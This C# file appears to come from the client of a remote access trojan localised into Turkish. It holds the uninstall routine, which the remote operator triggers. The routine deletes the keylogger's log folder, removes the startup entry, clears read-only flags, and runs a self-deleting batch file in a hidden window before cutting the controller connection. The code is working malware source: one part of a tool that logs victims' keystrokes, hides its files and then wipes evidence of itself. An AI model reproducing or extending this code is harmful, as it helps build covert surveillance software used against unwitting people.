using System;
using System.Diagnostics;
using System.IO;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Yardımcılar;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Kurulum
{
    public static class ClientKaldırıcı
    {
        public static void Uninstall(Client client)
        {
            try
            {
                RemoveExistingLogs();

                if (Settings.STARTUP)
                    Başlangıç.RemoveFromStartup();

                if (!DosyaYardımcısı.OkunabilirTemizle(ClientVerisi.CurrentPath))
                    throw new Exception("Could not clear read-only attribute");

                string batchFile = DosyaYardımcısı.KaldırmaBatı(Settings.INSTALL && Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create uninstall-batch file");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                Program.ConnectClient.Exit();
            }
            catch (Exception ex)
            {
                new Paketler.ClientPaketleri.SetStatus(string.Format("Kaldırma Başarısız: {0}", ex.Message)).Execute(client);
            }
        }

        public static void RemoveExistingLogs()
        {
            if (Directory.Exists(Keylogger.LogDirectory))
            {
                try
                {
                    Directory.Delete(Keylogger.LogDirectory, true);
                }
                catch
                {
                }
            }
        }
    }
}
